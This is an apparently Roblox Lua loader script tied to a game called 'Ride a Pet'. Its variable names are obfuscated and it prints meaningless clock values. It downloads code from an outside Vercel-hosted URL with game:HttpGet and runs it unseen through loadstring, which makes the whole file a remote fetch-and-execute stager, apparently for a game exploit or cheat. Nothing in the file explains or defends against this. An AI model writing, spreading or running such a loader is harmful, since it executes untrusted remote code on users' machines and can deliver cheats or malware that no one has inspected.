if not game:IsLoaded() then game.Loaded:Wait() end

local qV=os.clock()
local aN=os.time()
local xT=os.date("*t")
local mK=os.difftime(aN,aN-1)

print(qV)
print(aN)
print(xT)
print(mK)

local gR="https://loader999ms.vercel.app/loader/ride-a-pet.lua"..'?run='..tostring(qV)
local pY,wC=pcall(function() return game:HttpGet(gR) end)

if not pY or type(wC)~='string' or wC=='' then error("0x4f98daf3fd5d",0) end

local hF=loadstring or load

if type(hF)~='function' then error("0x75934d1098b9",0) end

local uJ,bM=pcall(hF,wC)

if not uJ or type(bM)~='function' then error("0xc6ee23173a05",0) end

return bM(...)
